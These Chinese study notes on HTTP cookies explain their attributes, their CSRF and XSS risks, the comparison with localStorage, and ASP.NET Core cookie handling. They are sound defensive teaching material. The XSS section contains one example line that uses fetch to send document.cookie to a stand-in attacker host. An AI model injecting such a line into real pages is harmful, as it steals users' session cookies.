# Cookie 学习笔记

## 1. Cookie 是什么

Cookie 是浏览器保存的一小段数据，通常由服务器通过响应头 `Set-Cookie` 写入浏览器。

之后浏览器再访问符合条件的地址时，会自动把对应 Cookie 放到请求头 `Cookie` 中发送给服务器。

典型流程：

```http
HTTP/1.1 200 OK
Set-Cookie: userId=1001; Path=/; HttpOnly; Secure; SameSite=Lax
```

后续请求：

```http
GET /profile HTTP/1.1
Cookie: userId=1001
```

Cookie 常见用途：

- 保存登录状态，例如认证票据。
- 保存用户偏好，例如语言、主题。
- 做临时追踪，例如购物车、访问来源。
- 配合服务端 Session 保存会话标识。

Cookie 不适合保存敏感明文信息，例如密码、身份证号、银行卡号。

## 2. Cookie 与 Session 的关系

Cookie 保存在浏览器端。

Session 通常保存在服务器端，浏览器只保存一个 SessionId Cookie。

例如：

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
```

服务器收到 `sessionId=abc123` 后，再去服务端存储中查找当前用户的会话数据。

简单理解：

- Cookie 是浏览器带来的“小票”。
- Session 是服务器根据小票找到的“记录”。

## 3. Cookie 的基本结构

一个 Cookie 至少包含名称和值：

```http
Set-Cookie: theme=dark
```

完整一点的 Cookie 会带属性：

```http
Set-Cookie: token=abc; Max-Age=3600; Path=/; Domain=example.com; HttpOnly; Secure; SameSite=Lax
```

主要组成：

- `token=abc`：Cookie 的名称和值。
- `Max-Age=3600`：3600 秒后过期。
- `Path=/`：只有匹配该路径的请求才会携带。
- `Domain=example.com`：指定可携带 Cookie 的域。
- `HttpOnly`：禁止 JavaScript 读取。
- `Secure`：只通过 HTTPS 发送。
- `SameSite=Lax`：限制跨站请求携带 Cookie 的方式。

## 4. 过期时间

Cookie 分为会话 Cookie 和持久 Cookie。

### 会话 Cookie

没有设置 `Expires` 或 `Max-Age` 时，通常是会话 Cookie，浏览器关闭后会被清除。

```http
Set-Cookie: mode=light
```

### 持久 Cookie

设置了 `Expires` 或 `Max-Age` 后，会保存到指定时间。

```http
Set-Cookie: mode=light; Max-Age=86400
```

```http
Set-Cookie: mode=light; Expires=Wed, 30 Jun 2027 12:00:00 GMT
```

区别：

- `Max-Age` 使用秒数，表示从现在开始多久后过期。
- `Expires` 使用具体日期时间。
- 两者同时存在时，`Max-Age` 优先级更高。

删除 Cookie 的本质是让浏览器收到一个已经过期的同名 Cookie。

```http
Set-Cookie: mode=; Max-Age=0; Path=/
```

## 5. Domain 和 Path

`Domain` 和 `Path` 决定浏览器在什么请求中携带 Cookie。

### Domain

如果不设置 `Domain`，Cookie 默认只属于当前主机。

例如服务器是：

```text
app.example.com
```

不设置 `Domain` 时，一般只发给 `app.example.com`。

如果设置：

```http
Set-Cookie: id=1; Domain=example.com
```

那么 `example.com` 以及它的子域名，如 `app.example.com`、`api.example.com`，也可能收到该 Cookie。

建议：能不设置 `Domain` 就不设置；必须共享给子域名时再设置。

### Path

`Path` 用于限制路径范围。

```http
Set-Cookie: adminToken=abc; Path=/admin
```

该 Cookie 会在访问 `/admin` 以及 `/admin/settings` 这类路径时携带。

建议：设置尽可能小的 `Path` 范围，减少 Cookie 暴露面。

## 6. HttpOnly

`HttpOnly` 表示禁止浏览器端 JavaScript 读取这个 Cookie。

```http
Set-Cookie: auth=abc; HttpOnly
```

设置后，下面代码读不到它：

```js
console.log(document.cookie);
```

作用：

- 降低 XSS 攻击偷取登录 Cookie 的风险。
- 常用于登录态 Cookie、SessionId Cookie。

注意：`HttpOnly` 不能阻止浏览器自动发送 Cookie。它只是阻止 JavaScript 读取。

## 7. Secure

`Secure` 表示 Cookie 只会通过 HTTPS 请求发送。

```http
Set-Cookie: auth=abc; Secure
```

建议：生产环境中的认证 Cookie 必须设置 `Secure`。

注意：如果使用 `SameSite=None`，现代浏览器要求同时设置 `Secure`。

```http
Set-Cookie: auth=abc; SameSite=None; Secure
```

## 8. SameSite

`SameSite` 用于控制跨站请求时是否携带 Cookie，主要用于降低 CSRF 风险。

### SameSite=Strict

最严格。跨站跳转也不会携带 Cookie。

```http
Set-Cookie: auth=abc; SameSite=Strict
```

适合安全要求很高、不依赖外部跳转登录的场景。

### SameSite=Lax

较常用。普通跨站导航 GET 请求可能携带 Cookie，但跨站表单 POST、iframe、图片等请求通常不会携带。

```http
Set-Cookie: auth=abc; SameSite=Lax
```

适合大多数普通站点的登录 Cookie。

### SameSite=None

允许跨站请求携带 Cookie，但必须配合 `Secure`。

```http
Set-Cookie: auth=abc; SameSite=None; Secure
```

常见场景：

- 第三方登录。
- 跨站 iframe。
- 前后端不在同一站点且必须携带 Cookie。

注意：`SameSite=None` 风险更高，需要搭配 CSRF 防护。

## 9. Cookie 和 CSRF

CSRF 的关键问题是：浏览器会自动携带目标网站的 Cookie。

假设用户已经登录银行网站，攻击者诱导用户访问恶意页面。恶意页面提交请求到银行网站时，浏览器可能自动带上银行网站 Cookie，服务器误以为是用户本人操作。

常见防护：

- 设置 `SameSite=Lax` 或 `SameSite=Strict`。
- 使用 CSRF Token。
- 对关键操作要求二次确认。
- 不用 GET 请求执行写操作。
- 检查 `Origin` 或 `Referer`。

Cookie 认证系统中，CSRF 防护非常重要。

## 10. Cookie 和 XSS

XSS 是攻击者把恶意脚本注入页面。

如果认证 Cookie 没有 `HttpOnly`，恶意脚本可以读取：

```js
fetch("https://attacker.example/steal?c=" + document.cookie);
```

防护建议：

- 登录 Cookie 设置 `HttpOnly`。
- 页面输出内容做 HTML 编码。
- 开启合理的 CSP。
- 不信任用户输入。
- 不把敏感数据直接放进 Cookie。

## 11. Cookie 大小限制

Cookie 不适合保存大量数据。

实践建议：

- 单个 Cookie 尽量控制在几 KB 内。
- Cookie 会随着请求自动发送，过多 Cookie 会增加请求体积。
- 大数据放服务器、数据库、缓存或 localStorage，不要塞进 Cookie。

认证 Cookie 如果过大，可能导致请求头过大、登录异常或性能下降。

## 12. Cookie 与 localStorage 的区别

| 对比点 | Cookie | localStorage |
| --- | --- | --- |
| 存储位置 | 浏览器 | 浏览器 |
| 是否自动随请求发送 | 是 | 否 |
| JavaScript 是否可读 | 默认可读，`HttpOnly` 后不可读 | 可读 |
| 容量 | 较小 | 较大 |
| 常见用途 | 登录态、会话标识、服务端需要自动接收的数据 | 前端偏好、缓存、非敏感状态 |
| 主要风险 | CSRF、泄露、请求变大 | XSS 读取 |

如果是服务端认证，常用 Cookie。

如果只是前端本地状态，常用 localStorage。

不要把敏感 Token 随便放进 localStorage，因为 XSS 后很容易被读取。

## 13. ASP.NET Core 中读写 Cookie

### 写入 Cookie

```csharp
app.MapGet("/set-cookie", (HttpContext context) =>
{
    context.Response.Cookies.Append("theme", "dark", new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Lax,
        Expires = DateTimeOffset.UtcNow.AddDays(7),
        Path = "/"
    });

    return "cookie saved";
});
```

### 读取 Cookie

```csharp
app.MapGet("/read-cookie", (HttpContext context) =>
{
    string? theme = context.Request.Cookies["theme"];
    return theme ?? "no cookie";
});
```

### 删除 Cookie

```csharp
app.MapGet("/delete-cookie", (HttpContext context) =>
{
    context.Response.Cookies.Delete("theme", new CookieOptions
    {
        Path = "/"
    });

    return "cookie deleted";
});
```

删除时要注意：`Name`、`Domain`、`Path` 最好和创建时保持一致，否则可能删不到同一个 Cookie。

## 14. ASP.NET Core CookieOptions 常用属性

```csharp
new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Lax,
    Expires = DateTimeOffset.UtcNow.AddDays(7),
    Path = "/",
    Domain = null,
    IsEssential = true
}
```

常用属性：

- `HttpOnly`：是否禁止 JavaScript 读取。
- `Secure`：是否只在 HTTPS 下发送。
- `SameSite`：跨站 Cookie 策略。
- `Expires`：过期时间。
- `MaxAge`：相对过期时间。
- `Path`：路径范围。
- `Domain`：域名范围。
- `IsEssential`：是否为必要 Cookie，常用于隐私/同意策略相关场景。

## 15. ASP.NET Core Cookie 认证简例

Cookie 认证通常不只是手动写 Cookie，而是使用认证中间件生成受保护的认证票据。

```csharp
using Microsoft.AspNetCore.Authentication.Cookies;

var builder = WebApplication.CreateBuilder(args);

builder.Services
    .AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.Cookie.Name = "my_app_auth";
        options.Cookie.HttpOnly = true;
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        options.Cookie.SameSite = SameSiteMode.Lax;
        options.LoginPath = "/login";
        options.AccessDeniedPath = "/denied";
        options.ExpireTimeSpan = TimeSpan.FromHours(2);
    });

builder.Services.AddAuthorization();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapGet("/profile", () => "profile")
   .RequireAuthorization();

app.Run();
```

重点：

- `AddAuthentication` 注册认证服务。
- `AddCookie` 使用 Cookie 认证方案。
- `UseAuthentication` 必须在 `UseAuthorization` 前面。
- 认证 Cookie 里保存的是受保护的认证票据，不应该自己手写明文用户信息。

## 16. 开发时常见问题

### 浏览器没有保存 Cookie

可能原因：

- `SameSite=None` 但没有设置 `Secure`。
- 本地使用 HTTP，但 Cookie 设置了 `Secure`。
- `Domain` 写错。
- 前端跨域请求没有开启携带凭据。
- 服务端 CORS 没允许凭据。
- Cookie 被浏览器隐私策略或第三方 Cookie 策略限制。

### 请求没有带 Cookie

可能原因：

- 请求域名和 Cookie 的 `Domain` 不匹配。
- 请求路径和 `Path` 不匹配。
- Cookie 已过期。
- 跨站请求被 `SameSite` 限制。
- `fetch` 或 axios 跨域请求没有设置携带凭据。

fetch 示例：

```js
fetch("https://api.example.com/profile", {
  credentials: "include"
});
```

axios 示例：

```js
axios.get("https://api.example.com/profile", {
  withCredentials: true
});
```

### Cookie 删除失败

可能原因：

- 删除时 `Path` 和创建时不一致。
- 删除时 `Domain` 和创建时不一致。
- 浏览器中存在多个同名但不同路径的 Cookie。

## 17. 推荐配置

登录 Cookie 推荐：

```http
Set-Cookie: auth=...; Path=/; HttpOnly; Secure; SameSite=Lax
```

跨站登录或第三方场景：

```http
Set-Cookie: auth=...; Path=/; HttpOnly; Secure; SameSite=None
```

普通偏好 Cookie：

```http
Set-Cookie: theme=dark; Path=/; Max-Age=2592000; SameSite=Lax
```

安全优先级：

- 认证 Cookie 尽量使用 `HttpOnly`。
- 生产环境使用 `Secure`。
- 默认优先考虑 `SameSite=Lax`。
- 只有确实需要跨站携带时才用 `SameSite=None; Secure`。
- 不在 Cookie 中保存敏感明文。
- Cookie 的 `Domain` 和 `Path` 范围越小越好。

## 18. 一句话总结

Cookie 是浏览器自动帮你保存并发送给服务器的小型键值数据。学习 Cookie 的重点不是“怎么存”，而是理解它什么时候会被发送、什么时候不会被发送，以及如何通过 `HttpOnly`、`Secure`、`SameSite`、`Domain`、`Path` 控制安全边界。

## 参考资料

- MDN: Using HTTP cookies - https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies
- MDN: Set-Cookie header - https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie
- Microsoft Learn: Work with SameSite cookies in ASP.NET Core - https://learn.microsoft.com/en-us/aspnet/core/security/samesite
- Microsoft Learn: Use cookie authentication without ASP.NET Core Identity - https://learn.microsoft.com/en-us/aspnet/core/security/authentication/cookie
